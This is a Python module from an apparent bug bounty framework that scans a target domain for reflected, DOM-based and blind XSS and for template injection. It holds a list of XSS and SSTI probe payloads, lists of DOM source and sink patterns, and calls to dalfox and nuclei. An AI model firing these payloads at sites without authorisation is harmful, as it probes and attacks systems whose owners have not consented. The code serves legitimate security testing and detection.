"""
SpondonFW - Vulnerability Module: XSS Scanner
Phase 3 of Spondon's Bug Bounty Methodology

Strategy (layered):
  1. Reflected XSS: dalfox on parameterised URLs
  2. Stored XSS: Manual payload injection via forms
  3. DOM-Based XSS: DOM invader patterns + source/sink analysis
  4. Blind XSS: XSS Hunter payload injection
  5. Template injection: Identify template engines, SSTI payloads
"""

import re
import time
import requests
from pathlib import Path
from typing import Dict, List, Set
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

from core.engine.base_module import BaseModule, ModuleResult


# XSS detection payloads (ordered by stealth/effectiveness)
REFLECTED_PAYLOADS = [
    '<script>alert(1)</script>',
    '"><script>alert(1)</script>',
    "'><script>alert(1)</script>",
    '<img src=x onerror=alert(1)>',
    '"><img src=x onerror=alert(1)>',
    "javascript:alert(1)",
    '<svg onload=alert(1)>',
    '"><svg onload=alert(1)>',
    '{{7*7}}',  # Template injection probe
    '${7*7}',
    '#{7*7}',
]

DOM_SINKS = [
    "document.write",
    "document.writeln",
    "innerHTML",
    "outerHTML",
    "insertAdjacentHTML",
    "eval(",
    "setTimeout(",
    "setInterval(",
    "location.href",
    "location.assign",
    "location.replace",
    "window.open(",
    "document.cookie",
]

DOM_SOURCES = [
    "location.href",
    "location.search",
    "location.hash",
    "document.URL",
    "document.documentURI",
    "document.baseURI",
    "document.referrer",
    "window.name",
]


class XSSScanner(BaseModule):

    name = "vuln.xss"
    description = "Multi-vector XSS detection: reflected, DOM-based, stored, blind, and SSTI"
    category = "vulnscan"
    tools_required = ["dalfox", "nuclei"]
    input_schema = {
        "target": "str — domain",
        "urls_file": "str (optional) — file with parameterised URLs",
        "params_file": "str (optional) — param discovery output",
        "blind_xss_payload": "str (optional) — blind XSS Hunter URL",
        "passive_only": "bool — only DOM analysis, no active injection",
    }
    output_schema = {
        "findings": "Confirmed and suspected XSS vulnerabilities",
        "files": {
            "xss_results.txt": "dalfox output",
            "dom_xss_candidates.txt": "DOM XSS suspects",
        }
    }
    tags = ["xss", "injection", "client-side", "phase3"]

    def execute(self, ctx: Dict) -> ModuleResult:
        result = ModuleResult(module_name=self.name, target=ctx["target"])
        result.started_at = time.time()

        target = ctx["target"]
        out = Path(ctx["output_dir"])
        out.mkdir(parents=True, exist_ok=True)
        passive_only = ctx.get("passive_only", False)

        # ── Step 1: Dalfox automated scan ────────────────────────────────────
        if not passive_only and self._tool_available("dalfox"):
            self.logger.info("Step 1/3 — Running dalfox")

            urls_file = ctx.get("urls_file") or self._find_previous_urls(ctx)
            if urls_file and Path(urls_file).exists():
                dalfox_out = str(out / "xss_dalfox.txt")
                blind_flag = ""
                if ctx.get("blind_xss_payload"):
                    blind_flag = f"--blind {ctx['blind_xss_payload']}"

                raw = self._run_tool(
                    f"dalfox file {urls_file} "
                    f"--only-poc r "
                    f"--silence "
                    f"{blind_flag} "
                    f"--output {dalfox_out} "
                    f"--timeout 10 "
                    f"--worker 10",
                    timeout=600
                )

                # Parse dalfox output
                dalfox_findings = self._parse_dalfox_output(dalfox_out)
                for f in dalfox_findings:
                    result.add_finding(
                        finding_type="reflected_xss",
                        value=f["url"],
                        severity="high",
                        url=f["url"],
                        evidence=f["payload"],
                        notes=f"Confirmed by dalfox | Parameter: {f.get('param', 'unknown')}"
                    )
                self.logger.info(f"  dalfox findings: {len(dalfox_findings)}")
            else:
                self.logger.warning("  No URLs file found for dalfox scan")
        else:
            self.logger.info("Step 1/3 — dalfox (skipped)")

        # ── Step 2: Manual reflected XSS probe ───────────────────────────────
        if not passive_only:
            self.logger.info("Step 2/3 — Manual XSS probes")
            urls_file = ctx.get("urls_file") or self._find_previous_urls(ctx)
            if urls_file and Path(urls_file).exists():
                urls = self._read_lines(urls_file)[:100]  # cap at 100
                manual_findings = self._manual_xss_probe(urls, target)
                for f in manual_findings:
                    result.add_finding(**f)
                self.logger.info(f"  Manual probe findings: {len(manual_findings)}")
        else:
            self.logger.info("Step 2/3 — Manual probe (passive_only=True, skipped)")

        # ── Step 3: DOM XSS analysis ─────────────────────────────────────────
        self.logger.info("Step 3/3 — DOM XSS analysis")
        js_dir = self._find_js_dir(ctx)
        dom_findings = []

        if js_dir and Path(js_dir).exists():
            dom_findings = self._analyze_dom_xss(js_dir)
            dom_out = str(out / "dom_xss_candidates.txt")
            self._write_lines(dom_out, [f["value"] for f in dom_findings])

            for f in dom_findings:
                result.add_finding(**f)
            self.logger.info(f"  DOM XSS candidates: {len(dom_findings)}")

        # ── Nuclei XSS templates ─────────────────────────────────────────────
        if self._tool_available("nuclei") and not passive_only:
            nuclei_out = str(out / "nuclei_xss.txt")
            raw = self._run_tool(
                f"nuclei -u https://{target} "
                f"-t vulnerabilities/xss/ "
                f"-t fuzzing/xss/ "
                f"-silent -o {nuclei_out}",
                timeout=300
            )
            nuclei_findings = self._parse_nuclei_output(nuclei_out)
            for f in nuclei_findings:
                result.add_finding(**f)
            self.logger.info(f"  nuclei XSS findings: {len(nuclei_findings)}")

        result.metadata = {
            "urls_tested": len(self._read_lines(ctx.get("urls_file", ""))),
            "dom_sources_checked": len(DOM_SOURCES),
            "dom_sinks_checked": len(DOM_SINKS),
        }

        result.finished_at = time.time()
        return result

    # ── Helpers ──────────────────────────────────────────────────────────────

    def _manual_xss_probe(self, urls: List[str], target: str) -> List[Dict]:
        """Test a sample of parameterised URLs with XSS payloads."""
        findings = []
        headers = {"User-Agent": "Mozilla/5.0 (SpondonFW/1.0)"}

        for url in urls:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            if not params:
                continue

            for param_name in params:
                for payload in REFLECTED_PAYLOADS[:5]:  # test top 5 per param
                    test_params = dict(params)
                    test_params[param_name] = [payload]
                    new_query = urlencode(test_params, doseq=True)
                    test_url = urlunparse(parsed._replace(query=new_query))

                    try:
                        resp = requests.get(test_url, headers=headers,
                                            timeout=5, verify=False)
                        if payload in resp.text:
                            findings.append({
                                "finding_type": "reflected_xss",
                                "value": test_url,
                                "severity": "high",
                                "url": test_url,
                                "evidence": f"Payload reflected: {payload}",
                                "notes": f"Parameter: {param_name}"
                            })
                            break  # Found one for this param, move on
                    except Exception:
                        continue

        return findings

    def _analyze_dom_xss(self, js_dir: str) -> List[Dict]:
        """Scan JS files for DOM source → sink patterns."""
        findings = []

        for js_file in Path(js_dir).rglob("*.js"):
            try:
                content = js_file.read_text(errors="ignore")
                lines = content.splitlines()

                # Check each line for sources near sinks
                for i, line in enumerate(lines):
                    has_source = any(src in line for src in DOM_SOURCES)
                    has_sink = any(sink in line for sink in DOM_SINKS)

                    if has_source and has_sink:
                        findings.append({
                            "finding_type": "dom_xss_candidate",
                            "value": str(js_file),
                            "severity": "medium",
                            "url": str(js_file),
                            "evidence": f"Line {i+1}: {line.strip()[:200]}",
                            "notes": "Source and sink on same line — manual verification needed"
                        })

                    # Separate: track source in context window
                    if has_sink:
                        # Check 5 lines above for a source
                        context = "\n".join(lines[max(0, i-5):i])
                        if any(src in context for src in DOM_SOURCES):
                            findings.append({
                                "finding_type": "dom_xss_candidate",
                                "value": str(js_file),
                                "severity": "medium",
                                "url": str(js_file),
                                "evidence": f"Sink at line {i+1}: {line.strip()[:200]}",
                                "notes": "User-controlled source flows into DOM sink"
                            })
            except Exception:
                continue

        return findings

    def _parse_dalfox_output(self, filepath: str) -> List[Dict]:
        results = []
        if not Path(filepath).exists():
            return results
        poc_pattern = re.compile(r'\[V\]\s+(https?://\S+)\s+\(([^)]+)\)')
        for line in self._read_lines(filepath):
            m = poc_pattern.search(line)
            if m:
                results.append({"url": m.group(1), "payload": m.group(2)})
        return results

    def _parse_nuclei_output(self, filepath: str) -> List[Dict]:
        findings = []
        if not Path(filepath).exists():
            return findings
        for line in self._read_lines(filepath):
            if "[" in line and "]" in line:
                findings.append({
                    "finding_type": "xss_nuclei",
                    "value": line,
                    "severity": "high",
                    "url": "",
                    "evidence": line,
                    "notes": "Nuclei template match"
                })
        return findings

    def _find_previous_urls(self, ctx: Dict) -> str:
        """Look in previous pipeline results for a URL file."""
        prev = ctx.get("previous_results", {})
        for stage_id, result in prev.items():
            if hasattr(result, 'metadata'):
                urls_file = result.metadata.get("output_files", {}).get("live_subdomains")
                if urls_file and Path(urls_file).exists():
                    return urls_file
        return ""

    def _find_js_dir(self, ctx: Dict) -> str:
        """Look in previous pipeline results for a JS files directory."""
        prev = ctx.get("previous_results", {})
        for stage_id, result in prev.items():
            if hasattr(result, 'metadata'):
                js_dir = str(Path(ctx.get("output_dir", "")) / ".." / "enum_js_analysis" / "js_files")
                if Path(js_dir).exists():
                    return js_dir
        return ""
